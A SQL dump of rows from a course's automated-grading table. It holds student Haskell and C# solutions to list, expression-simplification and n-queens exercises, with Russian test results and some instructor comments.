(3912, 86, '318210', '2012-11-21 18:58:45', 0, '\r\nallNondivisible xs = ch xs (\\_->True) \r\n	where \r\n		ch [] func = True \r\n	        ch (x:xs) func \r\n			 | not (func x) = False  \r\n			 | otherwise = ch xs (	 -> (func t) && ((max t x) `mod` (min t x) /= 0))\r\n\r\n\r\n-Да, я текст чего-то не вставил, просто я это же решение отправил вместе с задачей 27-1!', 'Не удалось вычислить выражение "allNondivisible [2, 7, 6, 5]", проверьте правильность синтаксиса'),
(3917, 101, '3431532', '2012-11-21 19:23:11', 2, 'data Expr = N Integer | X\r\n           | Mult Expr Expr\r\n           | Add  Expr Expr\r\n\r\ninstance Show Expr where\r\n  show (N  n) = "(N " ++ show n ++ ")"\r\n  show (Mult x y) = "(Mult " ++ show x ++ "*" ++ show y ++ ")"\r\n  show (Add x y) = "(Add " ++ show x ++ "+" ++ show y ++ ")"\r\n  show (X) = "X"\r\n\r\nsimplify X = X\r\nsimplify (N x) = N x\r\nsimplify (Mult (N 0) x ) = N 0\r\nsimplify (Mult x (N 0)) = N 0\r\nsimplify (Add x y) =  Add (simplify x) (simplify y)\r\nsimplify (Mult x y) = simplify( Mult (simplify x) (simplify y))\r\n   --- Так у вас зацикливается..', 'Выражение имеет неправильное значение: simplify (Mult X (Mult X (N 0)))'),
(3913, 86, '318210', '2012-11-21 19:01:12', 1, 'allNondivisible xs = ch xs (\\_->True) \r\n	where \r\n		ch [] func = True \r\n	        ch (x:xs) func \r\n			 | not (func x) = False  \r\n			 | otherwise = ch xs (	 -> (func t) && ((max t x) `mod` (min t x) /= 0))\r\n\r\n--Я решение это отправил вместе с 27-1)\r\n   --- Это я не очень понял - но ведь ее срок давно прошел? \r\n   --- Или я что то не понимаю - тогда пришлте ее еще раз, пожалуйста.\r\n      --- UPD - а, понял, это я сам же вас просил прислать. ОК, все ясно. ', '<br/>Тесты успешно пройдены!'),
(3914, 105, '383483', '2012-11-21 19:07:36', 1, 'cartesian xs ys = xs >>= (	->zip (map (m->t) [1..(length ys)]) ys) \r\n\r\n{--Прошу прощения, но это правда совпадение. Задачу честно решала сама!--}\r\n   --- ОК, верю)', '<br/>Тесты успешно пройдены!'),
(3915, 107, '44060', '2012-11-21 19:10:18', 1, 'data LogExpr = X | T | F | Not LogExpr | And LogExpr LogExpr | Or LogExpr LogExpr\r\n\r\nexpr X x = x\r\nexpr T _ = True\r\nexpr F _ = False\r\nexpr (Not x) y = not (expr x y)\r\nexpr (And x y) z = expr x z && expr y z\r\nexpr (Or x y) z = expr x z || expr y z\r\n\r\ninstance Eq LogExpr where\r\n    x == y = expr x True == expr y True && expr x False == expr y False', '<br/>Тесты успешно пройдены!'),
(3916, 109, 'Deutsche', '2012-11-21 19:14:12', 1, '﻿// Задача 29.1 Чистяков П.П. 543 гр.\r\n\r\nusing System;\r\n\r\n\r\n\r\nnamespace _29._1\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        public static void allDiffLists(int n, int k)\r\n\r\n        {\r\n\r\n            if (n < k) // чтобы не делать лишнего\r\n\r\n                Console.WriteLine("");\r\n\r\n            else\r\n\r\n                allDiffLists1(n, k, x => true, () => { Console.Write(""); });\r\n\r\n        }\r\n\r\n\r\n\r\n        public static void allDiffLists1(int n, int k, Func<int, bool> f, Action g)\r\n\r\n        {\r\n\r\n            if (k == 0)\r\n\r\n            {\r\n\r\n                g();\r\n\r\n                Console.WriteLine();\r\n\r\n                return;\r\n\r\n            }\r\n\r\n            for (int i = 1; i <= n; i++)\r\n\r\n            {\r\n\r\n                if (f(i))\r\n\r\n                {\r\n\r\n                    allDiffLists1(n, k - 1, j => f(j) && (j != i), () => { Console.Write(i + "  "); g(); });\r\n\r\n                }\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            int n = 0, k = 0;\r\n\r\n            Console.WriteLine("Input n, k (at list one of them <0 for exit)");\r\n\r\n            Console.WriteLine();\r\n\r\n            Console.Write("Input n: ");\r\n\r\n            n = Convert.ToInt32(Console.ReadLine());\r\n\r\n            Console.Write("Input k: ");\r\n\r\n            k = Convert.ToInt32(Console.ReadLine());\r\n\r\n            Console.WriteLine();\r\n\r\n            while ((n >= 0) && (k >= 0))\r\n\r\n            {\r\n\r\n                Console.WriteLine("Result:");\r\n\r\n                allDiffLists(n, k);\r\n\r\n                Console.WriteLine();\r\n\r\n                Console.WriteLine("Input n, k (at list one of them <0 for exit)");\r\n\r\n                Console.Write("Input n: ");\r\n\r\n                n = Convert.ToInt32(Console.ReadLine());\r\n\r\n                Console.Write("Input k: ");\r\n\r\n                k = Convert.ToInt32(Console.ReadLine());\r\n\r\n                Console.WriteLine();\r\n\r\n            }\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3918, 101, '3431532', '2012-11-21 19:27:59', 0, 'data Expr = N Integer | X\r\n           | Mult Expr Expr\r\n           | Add  Expr Expr\r\n\r\ninstance Show Expr where\r\n  show (N  n) = "N " ++ show n\r\n  show (Mult x y) = "Mult " ++ show x ++ show y\r\n  show (Add x y) = "Add (" ++ show x ++ ") " ++ show y\r\n  show (X) = "X"\r\n\r\nsimplify X = X\r\nsimplify (N x) = N x\r\nsimplify (Mult (N 0) x ) = N 0\r\nsimplify (Mult x (N 0)) = N 0\r\nsimplify (Add x y) =  Add (simplify x) (simplify y)\r\nsimplify (Mult x y) = simplify( Mult (simplify x) (simplify y))', 'Не удалось вычислить выражение "simplify (Mult X X)", проверьте правильность синтаксиса'),
(3919, 101, '3431532', '2012-11-21 19:38:43', 1, 'data Expr = N Integer | X\r\n           | Mult Expr Expr\r\n           | Add  Expr Expr\r\n\r\ninstance Show Expr where\r\n  show (N  n) = "N " ++ show n\r\n  show (Mult x y) = "Mult " ++ show x ++ " " ++ show y\r\n  show (Add x y) = "Add (" ++ show x ++ ") " ++ show y\r\n  show (X) = "X"\r\n\r\n\r\nsimplify X = X\r\nsimplify (N x) = N x\r\nsimplify (Add x y) =  Add (simplify x) (simplify y)\r\nsimplify (Mult x y) | (simp (simplify x)) == 0 || (simp (simplify y)) == 0 = N 0\r\nsimplify (Mult x y) =  Mult (simplify x) (simplify y)\r\n\r\n\r\nsimp (N 0) = 0\r\nsimp _ = -1', '<br/>Тесты успешно пройдены!'),
(3920, 102, '528420', '2012-11-21 19:40:00', 0, 'findMajor xs = myMajor xs (sum xs) \r\nmyMajor [] _ = Nothing\r\nmyMajor (x:xs) s = if (x > s - x) then Just x else myMajor xs s', '<br/>Тесты успешно пройдены!'),
(3921, 102, '528420', '2012-11-21 19:40:08', 1, 'findMajor xs = myMajor xs (sum xs) \r\nmyMajor [] _ = Nothing\r\nmyMajor (x:xs) s = if (x > s - x) then Just x else myMajor xs s', '<br/>Тесты успешно пройдены!'),
(3922, 104, '528420', '2012-11-21 19:41:03', 1, 'doubleEven xs = xs >>= (x -> if (x `mod` 2 == 0) then [x, x] else [x])', '<br/>Тесты успешно пройдены!'),
(3923, 100, '44060', '2012-11-21 19:44:17', 1, 'allDiffLists n k = func n k (const False)\r\n	where\r\n		func _ 0 _ = [[]]\r\n		func n k ch = [ (x:xs) | x <- [1..n], not (ch x), xs <- func n (k-1) (a -> ch a || a == x)]', '<br/>Тесты успешно пройдены!'),
(3924, 105, '419046', '2012-11-21 19:44:32', 1, 'cartesian xs ys = xs >>= x -> map (y -> (x,y)) ys\r\n', '<br/>Тесты успешно пройдены!'),
(3925, 103, '3607492', '2012-11-21 19:52:24', 1, 'find::(a->Bool)->[a]->a->a\r\nfind f [] err = err\r\nfind f (x:xs) err = if f x then x else find f xs err\r\n\r\nfindInLists [] f ex = ex\r\nfindInLists (x:xs) f ex = case (find f x (-9999)) of\r\n						  -9999 -> findInLists xs f ex\r\n						  z -> z', '<br/>Тесты успешно пройдены!'),
(3926, 100, '5772638', '2012-11-21 19:54:54', 1, 'alls n 0 cond =[[]]\r\nalls n k cond=[i:xs|i<-[1..n], cond i==True, xs<-alls n (k-1) (	->cond t&&t/=i)]\r\n\r\nallDiffLists n k = alls n k (	->True)\r\n \r\n--- Вы говорили, что можно прислать и 22-2,\r\n--- и тогда Вы ее тоже засчитаете\r\n\r\nallNondivisible []      = True\r\nallNondivisible (hd:tl) = (all (x -> mod x hd /= 0 && mod hd x /= 0) tl)&&(allNondivisible tl) \r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3927, 100, '4837959', '2012-11-21 19:55:29', 1, '--- You:\r\n\r\n  --- Нет, ну это вы просто переписали задачу, которую мы уже разбирали..\r\n\r\n  --- Тут надо как бы перемешать allLists и allDifferent'' - те перебирать варианты, и сразу отсеивать\r\n\r\n  --- неподходящие, как только что-то повторяется.\r\n\r\n  --- Попробуйте как-тто так написать, пожалуйста\r\n\r\n--- Me:\r\n\r\n  --- Понял, исправляюсь:\r\n\r\nallDiffLists n k = allDiffLists'' n k (	 -> False)\r\n\r\nallDiffLists'' n 0 set = [[]]\r\n\r\nallDiffLists'' n k set = [i:xs | i <- [1..n], not (set i), xs <- allDiffLists'' n (k - 1) (	 -> set t || t == i)]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3928, 107, '550896', '2012-11-21 20:12:04', 1, 'data LogExpr = X | T | F | Not LogExpr | And LogExpr LogExpr | Or LogExpr LogExpr deriving Show\r\n\r\ninstance Eq LogExpr where\r\n    e0 == e1 = checkEq (apply e0 T) (apply e1 T) && checkEq (apply e0 F) (apply e1 F)\r\n\r\ncheckEq :: LogExpr -> LogExpr -> Bool\r\ncheckEq T T = True\r\ncheckEq F F = True\r\ncheckEq e0 e1 = False\r\n\r\napply :: LogExpr -> LogExpr -> LogExpr\r\napply X c = c\r\napply T c = T\r\napply F c = F\r\napply (Not T) c = F\r\napply (Not F) c = T \r\napply (Not e) c = apply (Not (apply e c)) c\r\napply (And T T) c = T\r\napply (And F e1) c = F\r\napply (And e0 F) c = F\r\napply (And e0 e1) c = apply (And (apply e0 c) (apply e1 c)) c\r\napply (Or F F) c = F\r\napply (Or T e1) c = T\r\napply (Or e0 T) c = T\r\napply (Or e0 e1) c = apply (Or (apply e0 c) (apply e1 c)) c', '<br/>Тесты успешно пройдены!'),
(3929, 101, '3742311', '2012-11-21 20:20:18', 1, 'data Expr = N Integer | Add Expr Expr | Mult Expr Expr | X deriving (Eq, Show)\r\n\r\nsimplify X = (X)\r\nsimplify (N i) = (N i)\r\nsimplify (Add e1 e2) = (Add (simplify e1) (simplify e2))\r\nsimplify (Mult e1 e2) = let (s1, s2) = ((simplify e1), (simplify e2)) in if s1 == (N 0) || s2 == (N 0) then (N 0) else (Mult s1 s2)\r\n', '<br/>Тесты успешно пройдены!'),
(3930, 103, '3742311', '2012-11-21 20:34:51', 0, 'find cond [] err = err\r\nfind cond (x:xs) err = if cond x then x else find cond xs err\r\n\r\nfindInLists l cond err = find (x -> find cond x err != err) l err', 'Не удалось вычислить выражение "findInLists [[1,2], [2,8,7]] (>5) 0", проверьте правильность синтаксиса'),
(3931, 105, '5772638', '2012-11-21 20:35:28', 1, 'pairs x xs= if length xs==1 then [(x, head xs)]\r\n                            else (x,head xs): pairs x (tail xs)\r\n\r\ncartesian xs ys =if length xs==1 then pairs (head xs) ys\r\n                                 else pairs (head xs) ys++cartesian (tail xs) ys', '<br/>Тесты успешно пройдены!'),
(3932, 103, '3742311', '2012-11-21 20:36:15', 0, 'find cond [] err = err\r\nfind cond (x:xs) err = if cond x then x else find cond xs err\r\n\r\nfindInLists l cond err = find (x -> (find cond x err) != err) l err\r\n\r\n', 'Не удалось вычислить выражение "findInLists [[1,2], [2,8,7]] (>5) 0", проверьте правильность синтаксиса'),
(3933, 103, '3742311', '2012-11-21 20:39:35', 0, 'find cond [] err = err\r\nfind cond (x:xs) err = if cond x then x else find cond xs err\r\n\r\nfindInLists l cond err = find (x -> not ((find cond x err) == err)) l err\r\n', 'Не удалось вычислить выражение "findInLists [[1,2], [2,8,7]] (>5) 0", проверьте правильность синтаксиса'),
(3934, 100, '419046', '2012-11-21 20:41:33', 1, 'allDiffLists n k = allDiffLists1 n k (	 -> False)\r\n\r\nallDiffLists1 n 0 set = [[]]\r\n\r\nallDiffLists1 n k set = [i:xs | i <- [1..n], not (set i), xs <- allDiffLists1 n (k-1) (	 -> set t || t == i)]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3935, 104, '533223', '2012-11-21 20:44:48', 0, 'doubleEven xs = xs >>= if (rem x 2 == 0) then [ x, x ] else [ x ]', 'Не удалось вычислить выражение "doubleEven [1,2,6,3]", проверьте правильность синтаксиса'),
(3936, 108, '472848', '2012-11-21 20:45:46', 1, 'queens n k = g n k k ((x, y)->True)\r\n\r\ng _ _ 0 _ = [[]]\r\ng n k i pred = let x = k - i + 1 in [(x,y):li| y <- [1..n], pred (x, y), li <- g n k (i-1) ((xn, yn) -> \r\n  pred (xn, yn) && xn /= x && yn /= y && (xn + yn /= x + y) && (xn - yn /= x - y))]', '<br/>Тесты успешно пройдены!'),
(3937, 101, '374969', '2012-11-21 20:48:12', 0, 'data Expr = X | N Int | Mult Expr Expr | Add Expr Expr\r\n\r\nsimplify X = X\r\nsimplify (N a) = N a\r\nsimplify (Add e1 e2) = Add (simplify e1) (simplify e2)\r\nsimplify (Mult e1 (N 0)) = N 0\r\nsimplify (Mult (N 0) e2) = N \r\nsimplify (Mult e1 e2) = Mult (simplify e1) (simplify e2)', 'Не удалось вычислить выражение "simplify (Mult X (Mult X (N 0)))", проверьте правильность синтаксиса'),
(3938, 101, '374969', '2012-11-21 20:51:13', 0, 'data Expr = X | N Int | Mult Expr Expr | Add Expr Expr deriving Show\r\n\r\nsimplify X = X\r\nsimplify (N a) = N a\r\nsimplify (Add e1 e2) = Add (simplify e1) (simplify e2)\r\nsimplify (Mult e1 (N 0)) = N 0\r\nsimplify (Mult (N 0) e2) = N 0\r\nsimplify (Mult e1 e2) = Mult (simplify e1) (simplify e2)', 'Выражение имеет неправильное значение: simplify (Mult X (Mult X (N 0)))'),
(3939, 103, '3742311', '2012-11-21 20:54:09', 1, 'find cond [] err = err\r\nfind cond (x:xs) err = if cond x then x else find cond xs err\r\n\r\nfindInLists l cond err = find cond (find (x -> not ((find cond x err) == err)) l [err]) err\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3940, 101, '5477377', '2012-11-21 20:56:48', 1, 'data Expr = N Integer| X | Add Expr Expr| Mult Expr Expr deriving Show\r\n\r\ninstance Eq Expr where\r\n	N x == N y  =  x == y\r\n	X == X  =  True\r\n	Add a b == Add c d  =  (a == c) && (b == d)\r\n	Mult a b == Mult c d  =  (a == c) && (b == d)\r\n	_ == _  =  False\r\n   --- Или просто deriving (Show, Eq)\r\n\r\nsimplify (N a) = N a\r\nsimplify X = X\r\n\r\nsimplify (Add a b) = Add (simplify a) (simplify b)\r\n\r\nsimplify (Mult a b) = \r\n	let x = simplify a in\r\n	let y = simplify b in\r\n	if (x == (N 0)) || (y == (N 0)) then\r\n		N 0\r\n	else	\r\n		(Mult x y)\r\n', '<br/>Тесты успешно пройдены!'),
(3941, 94, '17107004', '2012-11-21 20:58:36', 1, 'data Scheme = R Float | Parallel Scheme Scheme | Sequential Scheme Scheme \r\n\r\n\r\n\r\ndata DrawScheme = DR Float | DConn Int Int | DCWire deriving (Show)\r\n\r\n\r\n\r\ndata DrawItem = DrawItem Int DrawScheme deriving (Show)\r\n\r\n\r\n\r\ndraw item 0 [] = [[item]]\r\n\r\ndraw item 0 (lst : lsts) = (lst ++ [item]) : lsts\r\n\r\ndraw item n (lst : lsts) = lst : (draw item (n - 1) lsts )\r\n\r\ndraw item n [] = [] : draw item (n - 1) [] \r\n\r\n\r\n\r\nspaceLen = 4\r\n\r\n\r\n\r\nschemeConvert sch ts lst = case sch of\r\n\r\n        (R val) -> draw (DrawItem ts (DR val)) 0 lst \r\n\r\n        (Sequential x y) -> \r\n\r\n                schemeConvert y (ts + (len x) + spaceLen) (schemeConvert x ts lst)\r\n\r\n        (Parallel x y) -> let xh = height x;\r\n\r\n                                begOff = ts + spaceLen;\r\n\r\n                                line intr off scr = foldl ( scr i -> draw (DrawItem off DCWire) i scr) scr intr;\r\n\r\n                                endOff = (ts + spaceLen * 2 + (max (len x) (len y))) in \r\n\r\n\r\n\r\n                        \r\n\r\n                        (take xh (line [1..(xh-1)] endOff\r\n\r\n                                (draw (DrawItem endOff (DConn (-1) 1))\r\n\r\n                                      0 (schemeConvert x begOff\r\n\r\n                                                (line [1..(xh - 1)] ts \r\n\r\n                                                        (draw (DrawItem ts (DConn 1 1)) 0 lst)))\r\n\r\n                                        ))) ++\r\n\r\n                        (draw (DrawItem endOff (DConn (-1) (-1))) \r\n\r\n                              0 (schemeConvert y begOff \r\n\r\n                                                (draw (DrawItem ts (DConn 1 (-1))) 0 (drop xh lst))))\r\n\r\n\r\n\r\nrepr (DR val) = "-|==" ++ (show (ceiling val)) ++ "==|-"\r\n\r\nrepr (DConn _ _) = "+"\r\n\r\nrepr (DCWire) = "|"\r\n\r\n\r\n\r\nblankRepr (DCWire) = "|"\r\n\r\nblankRepr (DConn _ (-1)) = "|"\r\n\r\nblankRepr sch = take (length (repr sch)) (repeat '' '')\r\n\r\n\r\n\r\nlen (R val) = length (repr (DR val)) \r\n\r\nlen (Parallel x y) = 2 + (spaceLen * 2) + max (len x) (len y)\r\n\r\nlen (Sequential x y) = (len x) + (len y) + spaceLen\r\n\r\n\r\n\r\nheight (R val) = 1\r\n\r\nheight (Sequential a b) = max (height a) (height b)\r\n\r\nheight (Parallel a b) = (height a) + (height b)\r\n\r\n\r\n\r\nschemeLineVis repr _ [] _ _ = []\r\n\r\nschemeLineVis repr ts ((DrawItem itemTs dSch) : items) wireSwitch wireCount = \r\n\r\n        let fill = repeat (if wireCount > 0 then ''-'' else '' '');\r\n\r\n                r = repr dSch in\r\n\r\n        (take (itemTs - ts) fill) ++ \r\n\r\n        r ++ \r\n\r\n        (schemeLineVis repr (itemTs + (length r)) \r\n\r\n                        items wireSwitch \r\n\r\n                        (if wireSwitch \r\n\r\n                                then (case dSch of\r\n\r\n                                        DConn v _ -> wireCount + v\r\n\r\n                                        _ -> wireCount) \r\n\r\n                                else wireCount))\r\n\r\n\r\n\r\nlam repr l wireSwitch = "\r\n    " ++ (schemeLineVis repr 0 l wireSwitch 0)\r\n\r\nshowSch sch = let visSch = schemeConvert sch 0 [] in \r\n\r\n        foldl ( b s -> b ++ s) \r\n\r\n                ((schemeLineVis repr (-4) (head visSch) False 1) ++ "----")\r\n\r\n                (map ( l -> (lam blankRepr l False) ++ (lam repr l True)) \r\n\r\n                        (tail visSch))\r\n\r\n\r\n\r\ninstance Show Scheme where\r\n\r\n        show = showSch\r\n\r\n\r\n\r\ntest1 = (R 10)\r\n\r\ntest2 = (Sequential (R 10) (R 10))\r\n\r\ntest3 = (Parallel (R 1000) (R 10))\r\n\r\ntest3'' = (Parallel (Sequential (R 1000) (R 1000)) (R 10))\r\n\r\ntest4 = (Parallel (R 100000000) (Parallel (R 1) (R 1000)))\r\n\r\ntest5 = (Sequential test4 test4)\r\n\r\ntest6 = (Parallel test4 test4)\r\n\r\n\r\n\r\ntest_inf = iterate (x -> (Parallel x x)) (R 10)\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3942, 101, '374969', '2012-11-21 21:26:21', 0, 'data Expr = X | N Int | Mult Expr Expr | Add Expr Expr deriving Show\r\n\r\nsimplifyh X = (X, False)\r\nsimplifyh (N a) = (N a, False)\r\nsimplifyh (Add e1 e2) = (Add ((fst.simplifyh) e1) ((fst.simplifyh) e2), (snd.simplifyh) e1 || (snd.simplifyh) e2)\r\nsimplifyh (Mult e1 (N 0)) = (Mult ((fst.simplifyh) e1) ((fst.simplifyh) e2), True)\r\nsimplifyh (Mult (N 0) e2) = (Mult ((fst.simplifyh) e1) ((fst.simplifyh) e2), True)\r\nsimplifyh (Mult e1 e2) = (Mult ((fst.simplifyh) e1) ((fst.simplifyh) e2), (snd.simplifyh) e1 || (snd.simplifyh) e2)\r\n\r\nsimplify expr = if (snd x) then (fst.simplify.fst) x else fst x with x = simplifyh expr', 'Не удалось вычислить выражение "simplify (Mult X (Mult X (N 0)))", проверьте правильность синтаксиса'),
(3943, 101, '63706456', '2012-11-21 21:31:20', 0, 'cantBeSimple (Mult _ (N 0)) = False\r\ncantBeSimple (Mult (N 0) _) = False\r\ncantBeSimple (Add l r) = cantBeSimple l && cantBeSimple r\r\ncantBeSimple (Mult l r) = cantBeSimple l && cantBeSimple r\r\ncantBeSimple _ = True\r\n\r\nsimplify (Mult _ (N 0)) = (N 0)\r\nsimplify (Mult (N 0) _) = (N 0)\r\nsimplify expr@(Add l r) = (Add (simplify'' l) (simplify'' r))\r\n				where 	simplify'' scheme = until cantBeSimple simplify scheme', 'Не удалось вычислить выражение "simplify (Mult X (Mult X (N 0)))", проверьте правильность синтаксиса'),
(3944, 101, '374969', '2012-11-21 21:35:58', 0, 'data Expr = X | N Int | Mult Expr Expr | Add Expr Expr deriving Show\r\n\r\nsimplifyh X = (X, False)\r\nsimplifyh (N a) = (N a, False)\r\nsimplifyh (Add e1 e2) = (Add ((fst.simplifyh) e1) ((fst.simplifyh) e2), (snd.simplifyh) e1 || (snd.simplifyh) e2)\r\nsimplifyh (Mult e1 (N 0)) = (N 0, True)\r\nsimplifyh (Mult (N 0) e2) = (N 0, True)\r\nsimplifyh (Mult e1 e2) = (Mult ((fst.simplifyh) e1) ((fst.simplifyh) e2), (snd.simplifyh) e1 || (snd.simplifyh) e2)\r\n\r\nsimplify expr = if (snd x) then (simplify.fst) x else fst x where x = simplifyh expr', '<br/>Тесты успешно пройдены!'),
(3945, 101, '374969', '2012-11-21 21:44:38', 1, 'data Expr = X | N Int | Mult Expr Expr | Add Expr Expr deriving Show\r\n\r\nsimplifyh X = (X, False)\r\nsimplifyh (N a) = (N a, False)\r\nsimplifyh (Add e1 e2) = (Add (fst a1) (fst a2), snd a1 || snd a2) \r\n							where a1 = simplifyh e1\r\n							      a2 = simplifyh e2\r\nsimplifyh (Mult e1 (N 0)) = (N 0, True)\r\nsimplifyh (Mult (N 0) e2) = (N 0, True)\r\nsimplifyh (Mult e1 e2) = (Mult (fst a1) (fst a2), snd a1 || snd a2) \r\n							where a1 = simplifyh e1\r\n							      a2 = simplifyh e2\r\n\r\nsimplify expr = if (snd x) then (simplify.fst) x else fst x where x = simplifyh expr', '<br/>Тесты успешно пройдены!'),
(3946, 102, '51559263', '2012-11-21 21:47:43', 0, 'fM [] _ = Nothing\r\n\nfM ( x : xs ) m = if x > m\r\n\n                  then Just x\r\n\n				  else fM xs m\r\n\n\r\n\nfindMajor xs = fM xs ( (sum xs) / 2 )\n', 'Выражение имеет неправильное значение: findMajor [2,3,15,2,2,2]'),
(3947, 102, '51559263', '2012-11-21 21:54:18', 1, 'fM [] _ = Nothing\r\n\r\nfM ( x : xs ) m = if x > m\r\n\r\n                  then Just x\r\n\r\n				  else fM xs m\r\n\r\n\r\n\r\nfindMajor xs = fM xs ( div (sum xs) 2 )\r\n', '<br/>Тесты успешно пройдены!'),
(3948, 101, '63706456', '2012-11-21 21:54:34', 1, 'data Expr = Mult Expr Expr | Add Expr Expr | X | N Integer deriving Show\r\n\r\nsimple (Mult _ (N 0)) = False\r\nsimple (Mult (N 0) _) = False\r\nsimple (Add l r) = simple l && simple r\r\nsimple (Mult l r) = simple l && simple r\r\nsimple _ = True\r\n\r\nsimplify (Mult _ (N 0)) = (N 0)\r\nsimplify (Mult (N 0) _) = (N 0)\r\nsimplify (Add l r) =	(Add (simplify'' l) (simplify'' r))\r\nsimplify (Mult l r) =	simplify'' (Mult (simplify'' l) (simplify'' r))\r\n\r\nsimplify'' scheme = until simple simplify scheme', '<br/>Тесты успешно пройдены!'),
(3949, 102, '374969', '2012-11-21 22:01:25', 0, 'findMajorh [] a sum = a\r\nfindMajorh (hd:tl) Nothing  sum = if(hd > sum)   then findMajorh tl (Just hd) sum      else findMajorh tl      Nothing (hd+sum)\r\nfindMajorh (hd:tl) (Just x) sum = if(x > hd+sum) then findMajorh tl (Just x)  (hd+sum) else findMajorh (hd:tl) Nothing (x+sum)\r\n\r\nfindMajor lst = findMajorh Nothing 0', 'Не удалось вычислить выражение "findMajor [2,3,15,2,2,2]", проверьте правильность синтаксиса'),
(3950, 102, '374969', '2012-11-21 22:02:56', 1, 'findMajorh [] a sum = a\r\nfindMajorh (hd:tl) Nothing  sum = if(hd > sum)   then findMajorh tl (Just hd) sum      else findMajorh tl      Nothing (hd+sum)\r\nfindMajorh (hd:tl) (Just x) sum = if(x > hd+sum) then findMajorh tl (Just x)  (hd+sum) else findMajorh (hd:tl) Nothing (x+sum)\r\n\r\nfindMajor lst = findMajorh lst Nothing 0', '<br/>Тесты успешно пройдены!'),
(3951, 100, '5477377', '2012-11-21 22:12:40', 1, 'allDiffLists1 _ 0 _ = [[]]\r\nallDiffLists1 n k cond = [i:xs| i <- [1..n], cond i, xs <- (allDiffLists1 n (k-1) (x -> cond x && x/= i))]\r\n\r\nallDiffLists n k = allDiffLists1 n k (x -> True)', '<br/>Тесты успешно пройдены!'),
(3952, 100, '63706456', '2012-11-21 22:14:38', 1, 'allDiffLists n k = allDiffLists'' n k (\\_ -> True)\r\n\r\nallDiffLists'' n 0 _ = [[]]\r\nallDiffLists'' n k p = [ i:xs | i <- [1..n], p i, xs <- allDiffLists'' n (k-1) (x -> x /= i && p x)]', '<br/>Тесты успешно пройдены!'),
(3953, 100, '3742311', '2012-11-21 22:17:10', 0, 'allDiffLists _ 0 _ = [[]]\r\nallDiffLists n k cond = [i:xs, i<-[1..n], cond i, xs<-allDiffLists n (k-1) (x -> cond x && x /= i)]\r\n\r\nallDiffLists n k = allDiffLists n k (x -> True)', 'Не удалось вычислить выражение "length (allDiffLists 3 3)", проверьте правильность синтаксиса'),
(3954, 100, '3742311', '2012-11-21 22:19:43', 0, 'allDiffLists _ 0 _ = [[]]\r\nallDiffLists n k cond = [i:xs| i<-[1..n], cond i, xs<-allDiffLists n (k-1) (x -> cond x && x /= i)]\r\n\r\nallDiffLists n k = allDiffLists n k (x -> True)', 'Не удалось вычислить выражение "length (allDiffLists 3 3)", проверьте правильность синтаксиса'),
(3955, 102, '5477377', '2012-11-21 22:21:32', 1, 'getEl [] = Nothing\r\ngetEl [x] = Just x\r\n\r\nfindMajor x = let z = sum x in\r\n	getEl (filter (y -> 2*y > z) x)', '<br/>Тесты успешно пройдены!'),
(3956, 100, '3742311', '2012-11-21 22:34:26', 0, 'allDiffLists _ 0 _ = [[]]\r\nallDiffLists n k cond = [i:xs| i<-[1..n], cond i, xs<-allDiffLists n (k-1) (x -> cond x && x /= i)]\r\n\r\nallDiffLists n k = allDiffLists n k (x -> True)', 'Не удалось вычислить выражение "length (allDiffLists 3 3)", проверьте правильность синтаксиса'),
(3957, 100, '3742311', '2012-11-21 22:35:38', 0, 'allDiffListsTmp _ 0 _ = [[]]\r\nallDiffListsTmp n k cond = [i:xs| i<-[1..n], cond i, xs<-allDiffLists n (k-1) (x -> cond x && x /= i)]\r\n\r\nallDiffLists n k = allDiffListsTmp n k (x -> True)', 'Не удалось вычислить выражение "length (allDiffLists 3 3)", проверьте правильность синтаксиса'),
(3958, 100, '3742311', '2012-11-21 22:36:04', 0, 'allDiffListsTmp _ 0 _ = [[]]\r\nallDiffListsTmp n k cond = [i:xs| i<-[1..n], cond i, xs<-allDiffLists n (k-1) (x -> cond x && x /= i)]\r\n\r\nallDiffLists n k = allDiffListsTmp n k (x -> True)\r\n\r\n', 'Не удалось вычислить выражение "length (allDiffLists 3 3)", проверьте правильность синтаксиса'),
(3959, 100, '3742311', '2012-11-21 22:36:48', 1, 'allDiffListsTmp _ 0 _ = [[]]\r\nallDiffListsTmp n k cond = [i:xs| i<-[1..n], cond i, xs<-allDiffListsTmp n (k-1) (x -> cond x && x /= i)]\r\n\r\nallDiffLists n k = allDiffListsTmp n k (x -> True)\r\n', '<br/>Тесты успешно пройдены!'),
(3960, 103, '5477377', '2012-11-21 22:38:31', 1, 'find cond [] err = err\r\nfind cond (x:xs) err = if cond x then x else find cond xs err\r\n\r\nfindInLists l cond err =  find cond [(find cond x err)| x <- l] err', '<br/>Тесты успешно пройдены!'),
(3961, 104, '5477377', '2012-11-21 22:41:49', 1, 'doubleEven x = x >>= (x -> if (mod x 2 == 0) then [x,x] else [x])', '<br/>Тесты успешно пройдены!'),
(3962, 105, '5477377', '2012-11-21 22:47:53', 1, 'cartesian a b = a >>= (x -> (map (y -> (x, y)) b))', '<br/>Тесты успешно пройдены!'),
(3963, 97, '5477377', '2012-11-21 22:59:09', 1, 'check [] [] = True\r\ncheck [] _ = False\r\n\r\ncheck ('')'':xs) (y:ys) =\r\n	if (y == ''('') then check xs ys\r\n	else False\r\ncheck ('']'':xs) (y:ys) =\r\n	if (y == ''['') then check xs ys\r\n	else False	\r\n	\r\ncheck (x:xs) a = check xs (x:a)\r\n\r\ncheckBrackets s = check s []', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
